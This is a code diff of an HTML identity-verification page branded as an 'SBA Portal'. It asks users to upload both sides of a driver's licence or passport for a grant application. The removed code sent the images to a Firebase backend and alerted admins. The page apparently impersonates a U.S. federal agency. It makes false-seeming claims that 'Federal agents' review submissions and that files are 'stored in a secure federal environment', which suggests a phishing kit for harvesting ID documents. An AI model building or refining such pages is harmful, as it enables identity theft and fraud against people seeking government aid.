@@ -4,167 +4,73 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Identity Verification | SBA Portal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link rel="stylesheet" href="global.css">
+    <style>
+        .upload-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
+        .upload-slot { border: 2px dashed var(--border); border-radius: 12px; padding: 30px; text-align: center; cursor: pointer; transition: var(--transition); background: white; }
+        .upload-slot:hover { border-color: var(--sba-navy); background: var(--sba-blue-light); }
+        .upload-slot i { font-size: 2rem; color: var(--text-muted); margin-bottom: 10px; }
+        .preview-img { width: 100%; height: 150px; object-fit: contain; display: none; margin-top: 10px; border-radius: 8px; }
+        @media (max-width: 600px) { .upload-grid { grid-template-columns: 1fr; } }
+    </style>
 </head>
-<body>
-    <div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
+<body style="background: #f1f5f9;">
+    <div class="container" style="max-width: 700px;">
+        <div style="text-align: center; margin-bottom: 40px;">
+            <img src="sba-logo.png" style="height: 60px; margin-bottom: 20px;">
+            <h2 style="color: var(--sba-navy);">Secure Identity Verification</h2>
+            <p style="color: var(--text-secondary);">Upload your Government-Issued Photo ID (Driver's License or Passport)</p>
+        </div>
 
-    <div class="app-layout">
-        <aside class="app-sidebar" id="appSidebar"></aside>
-        <div class="app-sidebar__overlay" id="sidebarOverlay"></div>
+        <div class="card">
+            <form id="kycForm">
+                <div class="upload-grid">
+                    <div class="upload-slot" onclick="document.getElementById('idFront').click()">
+                        <i class="fa-solid fa-address-card"></i>
+                        <p style="font-weight: 700; font-size: 14px;">Front of ID</p>
+                        <input type="file" id="idFront" hidden accept="image/*">
+                        <img id="frontPreview" class="preview-img">
+                    </div>
+                    <div class="upload-slot" onclick="document.getElementById('idBack').click()">
+                        <i class="fa-solid fa-barcode"></i>
+                        <p style="font-weight: 700; font-size: 14px;">Back of ID</p>
+                        <input type="file" id="idBack" hidden accept="image/*">
+                        <img id="backPreview" class="preview-img">
+                    </div>
+                </div>
 
-        <main class="app-main">
-            <header class="page-header" id="pageHeader"></header>
+                <div class="alert" style="background: #e0f2fe; color: #0369a1; padding: 15px; border-radius: 8px; font-size: 13px; display: flex; gap: 10px; margin-bottom: 25px;">
+                    <i class="fa-solid fa-shield-halved" style="font-size: 1.2rem;"></i>
+                    <span>Your documents are encrypted using 256-bit SSL and stored in a secure federal environment.</span>
+                </div>
 
-            <div class="app-main__content" style="max-width: 600px;">
-                <div id="kycTarget"></div>
-            </div>
-        </main>
+                <button type="submit" class="btn btn-primary btn-full" id="kycSubmitBtn">Submit for Verification</button>
+            </form>
+        </div>
     </div>
 
     <script type="module">
-        import { db, serverTimestamp, updateUserData, compressToBase64, notify, notifyAdmins } from './firebase-config.js';
-        import { requireAuth, buildSidebar, buildPageHeader, initTheme, initNotificationBadge, setButtonLoading, showToast } from './app.js';
-
-        requireAuth((user, userData) => {
-            initTheme();
-            buildSidebar({ activeId: 'kyc', userData });
-            buildPageHeader({ title: 'Verify Identity', subtitle: 'Secure KYC Document Submission', backUrl: 'dashboard.html' });
-            initNotificationBadge(user.uid);
-
-            const target = document.getElementById('kycTarget');
-
-            if (userData.kycStatus === 'PENDING' || userData.kycStatus === 'UNDER_REVIEW') {
-                target.innerHTML = `
-                    <div class="status-screen card">
-                        <div class="status-screen__icon status-screen__icon--info"><i class="fa-solid fa-magnifying-glass"></i></div>
-                        <h2 class="status-screen__title">Identity Under Review</h2>
-                        <p class="status-screen__message">Federal agents are verifying your documents. This usually takes 24-48 hours. You will receive an email once approved.</p>
-                        <a href="dashboard.html" class="btn btn--secondary">Go to Dashboard</a>
-                    </div>
-                `;
-            } else if (userData.kycStatus === 'APPROVED') {
-                target.innerHTML = `
-                    <div class="status-screen card">
-                        <div class="status-screen__icon status-screen__icon--success"><i class="fa-solid fa-id-card-clip"></i></div>
-                        <h2 class="status-screen__title">Identity Verified</h2>
-                        <p class="status-screen__message">Your identity has been successfully verified. You can now proceed with your grant application.</p>
-                        <a href="apply.html" class="btn btn--primary">Proceed to Application</a>
-                    </div>
-                `;
-            } else {
-                renderKycForm(user, userData, target);
-            }
-        });
-
-        function renderKycForm(user, userData, target) {
-            target.innerHTML = `
-                <div class="card">
-                    <p style="font-size:0.85rem; color:var(--text-secondary); margin-bottom:24px;">Please upload clear photos of your government-issued ID.</p>
-                    <form id="kycForm">
-                        <div class="form-group">
-                            <label class="form-label">ID Type</label>
-                            <select id="k-type" class="form-select" required>
-                                <option value="Driver License">Driver's License</option>
-                                <option value="Passport">Passport</option>
-                                <option value="State ID">State ID</option>
-                            </select>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label class="form-label">Front of ID</label>
-                            <div class="upload-area" id="up-front">
-                                <i class="fa-solid fa-camera upload-area__icon"></i>
-                                <div class="upload-area__label">Click to upload or drag photo</div>
-                                <input type="file" id="file-front" hidden accept="image/*">
-                                <img id="prev-front" class="upload-area__preview">
-                            </div>
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">Back of ID</label>
-                            <div class="upload-area" id="up-back">
-                                <i class="fa-solid fa-camera upload-area__icon"></i>
-                                <div class="upload-area__label">Click to upload or drag photo</div>
-                                <input type="file" id="file-back" hidden accept="image/*">
-                                <img id="prev-back" class="upload-area__preview">
-                            </div>
-                        </div>
-
-                        <button type="submit" class="btn btn--primary btn--full btn--lg mt-4" id="btnKyc">Submit for Verification</button>
-                    </form>
-                </div>
-            `;
-
-            const setupUpload = (areaId, inputId, prevId) => {
-                const area = document.getElementById(areaId);
-                const input = document.getElementById(inputId);
-                const prev = document.getElementById(prevId);
-                area.onclick = () => input.click();
-                input.onchange = (e) => {
-                    const file = e.target.files[0];
-                    if (file) {
-                        const reader = new FileReader();
-                        reader.onload = (ev) => {
-                            prev.src = ev.target.result;
-                            prev.style.display = 'block';
-                            area.classList.add('has-file');
-                        };
-                        reader.readAsDataURL(file);
+        import { compressImage } from './firebase-config.js';
+        
+        // Preview logic
+        const handlePreview = (input, previewId) => {
+            input.addEventListener('change', (e) => {
+                const file = e.target.files[0];
+                if(file) {
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        const prev = document.getElementById(previewId);
+                        prev.src = e.target.result;
+                        prev.style.display = 'block';
                     }
-                };
-            };
-
-            setupUpload('up-front', 'file-front', 'prev-front');
-            setupUpload('up-back', 'file-back', 'prev-back');
-
-            document.getElementById('kycForm').onsubmit = async (e) => {
-                e.preventDefault();
-                const btn = document.getElementById('btnKyc');
-                
-                const fileF = document.getElementById('file-front').files[0];
-                const fileB = document.getElementById('file-back').files[0];
-
-                if (!fileF || !fileB) return showToast('Please upload both sides of ID', 'warning');
-
-                setButtonLoading(btn, true, 'Compressing & Uploading...');
-
-                try {
-                    const b64Front = await compressToBase64(fileF);
-                    const b64Back = await compressToBase64(fileB);
-
-                    await updateUserData(user.uid, {
-                        kycStatus: 'UNDER_REVIEW',
-                        kyc: {
-                            idType: document.getElementById('k-type').value,
-                            idFrontBase64: b64Front,
-                            idBackBase64: b64Back,
-                            submittedAt: serverTimestamp()
-                        }
-                    });
-
-                    await notify(user.uid, {
-                        title: 'KYC Submitted',
-                        message: 'Your identity documents are being reviewed.',
-                        type: 'info'
-                    });
-
-                    await notifyAdmins({
-                        title: 'New KYC Submission',
-                        message: `${userData.fullName} submitted documents.`,
-                        type: 'action'
-                    });
-
-                    showToast('Documents submitted successfully', 'success');
-                    window.location.reload();
-                } catch (err) {
-                    setButtonLoading(btn, false);
-                    showToast('Upload failed', 'error');
+                    reader.readAsDataURL(file);
                 }
-            };
-        }
+            });
+        };
+
+        handlePreview(document.getElementById('idFront'), 'frontPreview');
+        handlePreview(document.getElementById('idBack'), 'backPreview');
     </script>
 </body>
 </html>
